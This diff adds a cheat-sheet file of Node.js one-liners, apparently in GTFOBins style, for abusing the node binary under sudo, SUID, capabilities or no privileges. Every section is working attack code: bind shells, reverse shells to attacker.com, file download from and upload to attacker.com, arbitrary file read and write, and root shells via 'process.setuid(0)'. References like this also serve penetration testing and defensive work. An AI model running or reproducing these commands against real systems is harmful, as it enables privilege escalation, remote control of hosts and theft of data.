@@ -1,0 +1,119 @@
+node
+====
+
+Bind shell
+----------
+
+[Sudo]
+    node -e 'sh = require("child_process").spawn("/bin/sh");
+require("net").createServer(function (client) {
+  client.pipe(sh.stdin);
+  sh.stdout.pipe(client);
+  sh.stderr.pipe(client);
+}).listen(12345)'
+
+[SUID]
+    node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
+require("net").createServer(function (client) {
+  client.pipe(sh.stdin);
+  sh.stdout.pipe(client);
+  sh.stderr.pipe(client);
+}).listen(12345)'
+
+[Unprivileged]
+    node -e 'sh = require("child_process").spawn("/bin/sh");
+require("net").createServer(function (client) {
+  client.pipe(sh.stdin);
+  sh.stdout.pipe(client);
+  sh.stderr.pipe(client);
+}).listen(12345)'
+
+Download
+--------
+
+[Sudo]
+    node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
+
+[SUID]
+    node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
+
+[Unprivileged]
+    node -e 'require("http").get("http://attacker.com/path/to/input-file", res => res.pipe(require("fs").createWriteStream("/path/to/output-file")))'
+
+File read
+---------
+
+[Sudo]
+    node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
+
+[SUID]
+    node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
+
+[Unprivileged]
+    node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
+
+File write
+----------
+
+[Sudo]
+    node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
+
+[SUID]
+    node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
+
+[Unprivileged]
+    node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
+
+Reverse shell
+-------------
+
+[Sudo]
+    node -e 'sh = require("child_process").spawn("/bin/sh");
+require("net").connect(12345, "attacker.com", function () {
+  this.pipe(sh.stdin);
+  sh.stdout.pipe(this);
+  sh.stderr.pipe(this);
+})'
+
+[SUID]
+    node -e 'sh = require("child_process").spawn("/bin/sh", ["-p"]);
+require("net").connect(12345, "attacker.com", function () {
+  this.pipe(sh.stdin);
+  sh.stdout.pipe(this);
+  sh.stderr.pipe(this);
+})'
+
+[Unprivileged]
+    node -e 'sh = require("child_process").spawn("/bin/sh");
+require("net").connect(12345, "attacker.com", function () {
+  this.pipe(sh.stdin);
+  sh.stdout.pipe(this);
+  sh.stderr.pipe(this);
+})'
+
+Shell
+-----
+
+[Capabilities]
+    node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+
+[Sudo]
+    node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+
+[SUID]
+    node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
+
+[Unprivileged]
+    node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
+
+Upload
+------
+
+[Sudo]
+    node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
+
+[SUID]
+    node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
+
+[Unprivileged]
+    node -e 'require("fs").createReadStream("/path/to/input-file").pipe(require("http").request("http://attacker.com/path/to/output-file"))'
